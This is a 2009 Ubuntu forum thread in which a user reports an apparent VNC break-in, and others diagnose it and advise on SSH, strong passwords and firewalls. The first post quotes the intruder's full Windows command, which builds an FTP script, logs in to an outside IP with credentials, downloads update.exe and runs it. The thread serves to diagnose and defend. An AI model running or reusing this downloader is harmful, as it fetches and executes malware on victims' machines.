---
title: "Hacked"
date: 2009-06-08
forum: Security
---

### Post by colombiche on 2009-06-08
I got a week with Ubuntu 9.0.4 installed and I saw that someone or a robot got into my pc I saw a screen saying someone at such address was using my computer.
 
On the terminal I saw a long command I don´t understand, here is what is all about.
 
cmd /c echo open 92.237.69.206 420
ik &echo user amy27188 catamy
ik &echo binary
ik &echo get update.exe
ik &echo by
ik@ftp -n -v -s:ik &del ik &update.exe &exit
 
Or is this any auto run file from the Linux system?
 
any advice?

---

### Post by rookcifer on 2009-06-08
Linux does not use nor recognize .exe's.  Do you have WINE installed?  Are you running a VNC server?  

What's happening here is the command is trying to download via FTP a file named update.exe.  The username to the site is amy27188 and the password is catamy.  

A google search reveals that at least one OS X user had this identical thing happen to them.  The guy investigated and his post is [worth reading.]("http://episteme.arstechnica.com/eve/forums/a/tpc/f/469092836/m/264004244831")  OS X is a UNIX and uses the bash shell, thus the commands used in this potential exploit work the same on it and Linux.

I wouldn't worry too much right now as to an "infection" because the payload is an .exe which won't work anyway.  But I would be interested in figuring out how this happened in the first place.  According to the above link, VNC was the culprit.  You have to remember that Linux is generally secure as a desktop box, but when you start running servers open to the Internet at large, you must take measures to secure them.

---

### Post by colombiche on 2009-06-08
As fas as I know I don´t have WINE installed unless it is pre-installed with Ubuntu. 
 
But I got some xp machines on the network.

---

### Post by rookcifer on 2009-06-08
> **colombiche said:**
> As fas as I know I don´t have WINE installed unless it is pre-installed with Ubuntu. 
 
But I got some xp machines on the network.

How about VNC?

I just downloaded the payload file "update.exe."  Unfortunately I am on a Linux box right now, of course, so I am going to see if I can't find a way to analyze the file (maybe put it through a virus scanner).

---

### Post by Wiebelhaus on 2009-06-08
Chek my sig for a top notch world class scanner and set up your firewall which can be found in the repositories.

---

### Post by colombiche on 2009-06-08
Yes I got VNC on the xp and I got desktopshare on Ubuntu. I will see about snort.

---

### Post by bodhi.zazen on 2009-06-08
> **colombiche said:**
> Yes I got VNC on the xp and I got desktopshare on Ubuntu. I will see about snort.

Your VNC connection was most likely cracked.

You need to user stronger passwords or better yet vnc over ssh.

Best change the password now.

[Password Strength Checker]("http://www.passwordmeter.com/") 

As those were windows programs you are probably OK, but difficult to know for sure.

I would not rely on some type of root kit scanner as who knows what is in the payload ?

Scanners only scan for known cracks. I do not know how antivirus scanners will help you, but perhaps bitdefender has some feature I do not know about.

---

### Post by rookcifer on 2009-06-08
> **bodhi.zazen said:**
> 
Scanners only scan for known cracks. I do not know how antivirus scanners will help you, but perhaps bitdefender has some feature I do not know about.

Well I was referring to scanning the Windows .exe with a scanner just to find out if it is known, and if so, what it does exactly.  It's probably just a trojan, actually.

---

### Post by meeples on 2009-06-08
i found this post on a package called ninja which might be able to stop such things. [http://blog.bodhizazen.net/linux/how-to-ninja/]("http://blog.bodhizazen.net/linux/how-to-ninja/")

it seems to kill any unauthorised root access.

might be worth installing,

---

### Post by HermanAB on 2009-06-08
In all my decades of working with Unix machines *every* time that I encountered hacked boxes it was due to some kid who thought that using a 4 character password was Uber Kool.

Keeping your box secure is very easy:
1. Don't run telnet, FTP or VNC servers. Use SSH instead.
2. Use passwords longer than 8 characters for *all* accounts.

I think that the Ubuntu distribution's promotion of VNC over SSH and its failure to enforce passwords longer than 8 characters is almost criminal.

---

### Post by balloooza on 2009-06-08
I use vnc WITHIN my network, but I have a server (running ebox, and specialy configured to be secure by me, but if this post results in me finding out that that is not secure I will tighten up security)
I would never open any port, even ssh to the outside, all that is open is vpn.
That is my question, even if somone got through vpn, is stupid to have vnc expsed, or would it be smart to use ssh, or is vpn (open vpn, using *not* a password, but *3* client signiture files) secure  enough by itself
(I am a home user)
(uhh, and my signiture says somthing about windows, I  only have a mac and linux)

---

### Post by rookcifer on 2009-06-09
> **balloooza said:**
> I use vnc WITHIN my network, but I have a server (running ebox, and specialy configured to be secure by me, but if this post results in me finding out that that is not secure I will tighten up security)
I would never open any port, even ssh to the outside, all that is open is vpn.
That is my question, even if somone got through vpn, is stupid to have vnc expsed, or would it be smart to use ssh, or is vpn (open vpn, using *not* a password, but *3* client signiture files) secure  enough by itself
(I am a home user)
(uhh, and my signiture says somthing about windows, I  only have a mac and linux)

I'm a little confused by your post's wording, but as long as the VNC server is not open to the outside world and you use a strong password, you should have no worries.

---

### Post by bodhi.zazen on 2009-06-09
> **balloooza said:**
> I use vnc WITHIN my network, but I have a server (running ebox, and specialy configured to be secure by me, but if this post results in me finding out that that is not secure I will tighten up security)
I would never open any port, even ssh to the outside, all that is open is vpn.
That is my question, even if somone got through vpn, is stupid to have vnc expsed, or would it be smart to use ssh, or is vpn (open vpn, using *not* a password, but *3* client signiture files) secure  enough by itself
(I am a home user)
(uhh, and my signiture says somthing about windows, I  only have a mac and linux)

It depends on who you ask and your level of paranoia.

Security is like an onion, it has layers, and they stink :twisted:

Some people will say no, you are protected by a router. Others would say yes, you should run a firewall on every machine.

Only you can decide for yourself , but yes if you have what is termed a "compromised host" on your LAN, it can be leveraged to launch attack on your entire network.

---

### Post by HermanAB on 2009-06-09
SSH is a kind of ad-hoc VPN system.  Having it exposed to the outside world is fine but it does attract script kiddies, so I always configure it to use a non standard port which prevents most of the problems.

VNC, FTP and Telnet servers are EVIL, since they forward the username and password in plain text over the network (POP and IMAP also do the same thing).  So it is trivial for someone on your physical net to sniff the the login parameters.

---

